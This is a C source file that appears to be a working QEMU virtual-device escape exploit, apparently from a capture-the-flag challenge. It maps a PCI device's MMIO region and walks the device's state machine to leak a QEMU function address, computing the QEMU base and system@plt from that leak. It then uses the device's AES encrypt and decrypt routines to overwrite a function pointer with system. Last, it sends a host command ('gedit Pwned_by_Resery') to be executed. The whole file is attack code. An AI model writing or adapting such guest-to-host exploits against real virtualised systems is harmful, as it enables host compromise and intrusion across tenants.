/*
* @Author: resery
* @Date:   2020-10-20 15:00:20
* @Last Modified by:   resery
* @Last Modified time: 2020-10-21 14:38:12
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>
#include <stdint.h>

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)

uint64_t system_plt;

unsigned char* mmio_mem;

void mmio_write(uint32_t addr, uint8_t value)
{
    *((uint8_t*)(mmio_mem + addr)) = value;
}

uint8_t mmio_read(uint32_t addr)
{
    return *((uint8_t*)(mmio_mem + addr));
}

uint8_t init(){
	return mmio_read(0);
}

uint8_t set_statu_1(){
	return mmio_read(2);
}

uint8_t set_statu_2(){
	return mmio_read(4);
}

uint8_t set_statu_3(){
	return mmio_read(1);
}

uint8_t set_statu_4(){
	return mmio_read(3);
}

uint8_t set_stream_fucntion(){
	return mmio_read(7) & mmio_read(8);
}

uint8_t set_aes_fucntion(){
	return mmio_read(5) & mmio_read(6);
}

uint32_t call_enc_fucntion(){
	return mmio_read(9);
}

uint32_t call_dec_fucntion(){
	return mmio_read(10);
}

int stuff_key(){
	int i = 0;
	for(i=0;i<=0x7ff;i++){
		mmio_write(0x1000+i,0x11);
	}
	if(i){
		return 1;
	}
	else{
		return 0;
	}
}

int stuff_key_system(){
	int i = 0;
	for(i=0;i<0x10;i++){
		mmio_write(0x1000+i,'\x01');
	}
	if(i){
		return 1;
	}
	else{
		return 0;
	}
}

int stuff_input(){
	int i = 0, j = 0;
	for(i=0;i<=0x7ff;i++){
		mmio_write(0x2000+i,0x22);
	}
	if(i){
		return 1;
	}
	else{
		return 0;
	}
}

int stuff_input_system(){
	int i = 0, j = 0;
	for(i=0;i<=0x7ff;i++){
		if(i<=0x7ff-8){
			mmio_write(0x2000+i,'a');
		}
		else{
			mmio_write(0x2000+i,((uint8_t*)&system_plt)[j]^'a');
			j++;
		}
	}
	if(i){
		return 1;
	}
	else{
		return 0;
	}
}

uint64_t leak_function_addr(){
	uint64_t tmp;
	uint64_t result = 0;
	for(int i=0;i<6;i++){
		tmp = mmio_read(0x3800+i);
		result += tmp << i*8;
	}
	return result;
}

int main(){
	uint64_t encrypt_function_addr;
	uint8_t enc_data[2048];

	int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1){
        perror("open mmio");
        exit(-1);
    }

    mmio_mem = mmap(0, 0x100000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED){
    	perror("mmap mmio");
        exit(-1);
    }

    printf("mmio_mem:\t%p\n", mmio_mem);

    //--------------------------------------------------------------------
    //		first
   	//--------------------------------------------------------------------
   	//if want ro write to key statu should valued 3
    //init -----> statu = 0
    system("clear");
    printf("[+] first\n");
    if(!init()){
    	printf("[+] Init Failed\n");
    	return 0;
    }
    printf("[+] Init Successed\n");

    //set statu 3
    if(!set_statu_3()){
    	printf("[+] Set Statu = 3 Failed\n");
    	return 0;
    }
    printf("[+] Set Statu = 3 Successed\n");

    //stuff key_buf
    if(!stuff_key()){
		printf("[+] Stuff Key Failed\n");
		return 0;
    }
    printf("[+] Stuff Key Successed\n");
    //--------------------------------------------------------------------
    //if want ro write to input statu should valued 1
    if(!set_statu_4()){
    	printf("[+] Set Statu = 4 Failed\n");
    	return 0;
    }
    printf("[+] Set Statu = 4 Successed\n");

    if(!set_statu_1()){
    	printf("[+] Set Statu = 1 Failed\n");
    	return 0;
    }
    printf("[+] Set Statu = 1 Successed\n");

    //stuff input_buf
    if(!stuff_input()){
		printf("[+] Stuff Input Failed\n");
		return 0;
    }
    printf("[+] Stuff Input Successed\n");
    //--------------------------------------------------------------------
    if(!set_statu_2()){
    	printf("[+] Set Statu = 2 Failed\n");
    	return 0;
    }
    printf("[+] Set Statu = 2 Successed\n");

    //set stream function and call
    if(!set_stream_fucntion()){
		printf("[+] Set Stream Fucntion Failed\n");
		return 0;
    }
    printf("[+] Set Stream Fucntion Successed\n");

    if(!call_enc_fucntion()){
		printf("Call Stream Fucntion Failed\n");
		return 0;
    }
    printf("[+] Call Stream Fucntion Successed\n");
    //--------------------------------------------------------------------
    if((encrypt_function_addr = leak_function_addr()) == 0){
    	printf("[+] Leak Fucntion Address Failed\n");
		return 0;
    }
    printf("\n[+] Leak Successed\n");
    printf("[+] encrypt function addr :\t0x%" PRIx64 "\n",encrypt_function_addr);

    uint64_t base_addr = encrypt_function_addr - 0x4d2a20;
    system_plt = base_addr + 0x2ADF80;
    printf("[+] qemu base addr :\t0x%" PRIx64 "\n",encrypt_function_addr);
    printf("[+] system plt addr:\t0x%" PRIx64 "\n",encrypt_function_addr);
    sleep(2);
    //--------------------------------------------------------------------
    //		second
    //--------------------------------------------------------------------
    //if want ro write to key statu should valued 3
    //init -----> statu = 0
    system("clear");
    printf("[+] second\n");
    if(!init()){
    	printf("[+] Init Failed\n");
    	return 0;
    }
    printf("[+] Init Successed\n");

    if(!set_statu_1()){
    	printf("[+] Set Statu = 1 Failed\n");
    	return 0;
    }
    printf("[+] Set Statu = 1 Successed\n");

    //stuff input_buf
    if(!stuff_input_system()){
		printf("[+] Stuff Input Failed\n");
		return 0;
    }
    printf("[+] Stuff Input Successed\n");

    if(!set_statu_2()){
    	printf("[+] Set Statu = 2 Failed\n");
    	return 0;
    }
    printf("[+] Set Statu = 2 Successed\n");

    //set statu 3
    if(!set_statu_3()){
    	printf("[+] Set Statu = 3 Failed\n");
    	return 0;
    }
    printf("[+] Set Statu = 3 Successed\n");

    //stuff key_buf
    if(!stuff_key_system()){
		printf("[+] Stuff Key Failed\n");
		return 0;
    }
    printf("[+] Stuff Key Successed\n");

    if(!set_statu_4()){
    	printf("[+] Set Statu = 4 Failed\n");
    	return 0;
    }
    printf("[+] Set Statu = 4 Successed\n");

    //set aes function and call
    if(!set_aes_fucntion()){
		printf("[+] Set Aes Fucntion Failed\n");
		return 0;
    }
    printf("[+] Set Aes Fucntion Successed\n");

    if(!call_enc_fucntion()){
		printf("[+] Call Aes Fucntion Failed\n");
		return 0;
    }
    printf("[+] Call Aes Fucntion Successed\n");

    int i=0;
    for(i=0; i<=0x7ff; i++) {
        enc_data[i] = mmio_read(0x3000+i);
    }

    if(i!=0x800){
    	printf("[+] Leak Crc Failed\n");
		return 0;
    }
    printf("[+] Leak Crc Successed\n");
    sleep(2);
    //--------------------------------------------------------------------
    //		third
    //--------------------------------------------------------------------
    system("clear");
    printf("[+] third\n");
    if(!init()){
    	printf("[+] Init Failed\n");
    	return 0;
    }
    printf("[+] Init Successed\n");

    if(!set_statu_1()){
    	printf("[+] Set Statu = 1 Failed\n");
    	return 0;
    }
    printf("[+] Set Statu = 1 Successed\n");

    for (i=0; i<=0x7ff; i++){
        mmio_write(0x2000+i, enc_data[i]);
    }
    if(i!=0x800){
    	printf("[+] Write System Failed\n");
		return 0;
    }
    printf("[+] Write System Successed\n");

    if(!set_statu_2()){
    	printf("[+] Set Statu = 2 Failed\n");
    	return 0;
    }
    printf("[+] Set Statu = 2 Successed\n");

    //set statu 3
    if(!set_statu_3()){
    	printf("[+] Set Statu = 3 Failed\n");
    	return 0;
    }
    printf("[+] Set Statu = 3 Successed\n");

    //stuff key_buf
    if(!stuff_key_system()){
		printf("[+] Stuff Key Failed\n");
		return 0;
    }
    printf("[+] Stuff Key Successed\n");

    if(!set_statu_4()){
    	printf("[+] Set Statu = 4 Failed\n");
    	return 0;
    }
    printf("[+] Set Statu = 4 Successed\n");

    //set aes function and call
    if(!set_aes_fucntion()){
		printf("[+] Set Aes Fucntion Failed\n");
		return 0;
    }
    printf("[+] Set Aes Fucntion Successed\n");

    if(!call_dec_fucntion()){
		printf("[+] Call Aes Dec Fucntion Failed\n");
		return 0;
    }
    printf("[+] Call Aes Dec Fucntion Successed\n");
    sleep(2);
    //--------------------------------------------------------------------
    //		final
    //--------------------------------------------------------------------
    system("clear");
    printf("[+] final\n");

    if(!init()){
    	printf("[+] Init Failed\n");
    	return 0;
    }
    printf("[+] Init Successed\n");

    if(!set_statu_1()){
    	printf("[+] Set Statu = 1 Failed\n");
    	return 0;
    }
    printf("[+] Set Statu = 1 Successed\n");

    char *shellcode="gedit Pwned_by_Resery";
    for (i=0; i< strlen(shellcode); i++){
    	mmio_write(0x2000+i, shellcode[i]);
    }

    if(!set_statu_2()){
    	printf("[+] Set Statu = 2 Failed\n");
    	return 0;
    }
    printf("[+] Set Statu = 2 Successed\n");

    if(!call_enc_fucntion()){
		printf("[+] Call Aes Dec Fucntion Failed\n");
		return 0;
    }
    printf("[+] Call Aes Dec Fucntion Successed\n");

}